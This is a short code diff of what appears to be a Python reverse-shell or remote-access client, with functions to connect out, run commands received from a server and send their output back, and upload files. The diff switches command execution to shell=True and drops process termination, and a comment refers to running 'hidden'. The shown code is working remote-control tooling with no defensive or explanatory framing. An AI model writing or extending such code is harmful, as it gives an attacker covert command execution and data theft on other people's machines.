@@ -22,10 +22,9 @@ def connect():
 
 # Interactive Shell		(For Hidden, shell=False)
 def command():
-    cmd = subprocess.Popen(srv_cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     output = cmd.stdout.read() + cmd.stderr.read()
     s.send(output)
-    cmd.terminate()
 
 # Upload File
 def send_file():
